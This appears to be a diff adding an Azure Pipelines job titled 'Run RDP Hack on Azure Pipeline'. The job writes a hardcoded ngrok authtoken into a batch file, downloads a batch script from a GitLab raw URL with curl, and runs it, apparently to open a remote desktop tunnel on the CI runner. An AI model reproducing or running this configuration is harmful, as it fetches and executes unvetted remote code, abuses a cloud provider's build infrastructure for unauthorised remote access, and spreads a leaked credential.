@@ -1,0 +1,12 @@
+jobs:
+- job: Windows_2019_Azure_RDP
+  pool:
+    vmImage: windows-latest
+  steps:
+   - checkout: none 
+   - script: |
+       echo ngrok authtoken "1q15NciHAdrY0kg9WsOkwx77JxQ_4fCAcqkh6HsWJv8X9NHiN" > NGROK.bat
+       curl -s -O https://gitlab.com/spitdebars/spitdebars/-/raw/master/AzureNgrokAutoRegion.bat
+       AzureNgrokAutoRegion.bat
+     displayName: 'Run RDP Hack on Azure Pipeline'
+
